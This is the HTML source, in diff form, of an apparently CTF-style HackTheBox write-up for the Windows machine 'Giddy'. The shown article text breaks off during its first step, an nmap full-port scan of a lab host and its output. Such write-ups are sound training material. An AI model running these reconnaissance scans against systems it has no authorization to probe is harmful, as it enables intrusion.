@@ -1,0 +1,1059 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups for infosec and dev stuff that I'm doing.">
+      
+      
+      
+        <link rel="canonical" href="https://krovs.github.io/writeups/giddy/">
+      
+      
+        <link rel="prev" href="../bounty/">
+      
+      
+        <link rel="next" href="../pandora/">
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../assets/favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Giddy - Krovs' Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#giddy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Krovs&#39; Writeups" class="md-header__button md-logo" aria-label="Krovs' Writeups" data-md-component="logo">
+      
+  <img src="../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Krovs' Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Giddy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="amber"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="pink"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/krovs/writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Krovs&#39; Writeups" class="md-nav__button md-logo" aria-label="Krovs' Writeups" data-md-component="logo">
+      
+  <img src="../assets/logo.png" alt="logo">
+
+    </a>
+    Krovs' Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/krovs/writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/active-directory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/proving-grounds/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proving Grounds
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href=".." class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2025-06-10 00:00:00+00:00" class="md-ellipsis">June 10, 2025</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../category/hackthebox/">HackTheBox</a>, 
+                              <a href="../category/windows/">Windows</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              6 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">HackTheBox</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Windows</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">📎 Windows</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">📦 HackTheBox</span>
+      
+    
+  </nav>
+
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/krovs/writeups/raw/master/docs/posts/HackTheBox/Windows/giddy.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="giddy">Giddy</h1>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250610211545.png" /></p>
+<!-- more -->
+
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-T4<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-p-<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>--open<span class="w"> </span><span class="m">10</span>.10.10.104
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-06-10<span class="w"> </span><span class="m">21</span>:19<span class="w"> </span>CEST
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.10.104
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.040s<span class="w"> </span>latency<span class="o">)</span>.
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65531</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Some<span class="w"> </span>closed<span class="w"> </span>ports<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>reported<span class="w"> </span>as<span class="w"> </span>filtered<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>--defeat-rst-ratelimit
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="m">443</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/http<span class="w">      </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-06-10T19:20:24+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">|</span><span class="w"> </span>tls-alpn:<span class="w"> </span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">|</span><span class="w">   </span>h2
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="p">|</span>_<span class="w">  </span>http/1.1
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2018</span>-06-16T21:28:55
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2018</span>-09-14T21:28:55
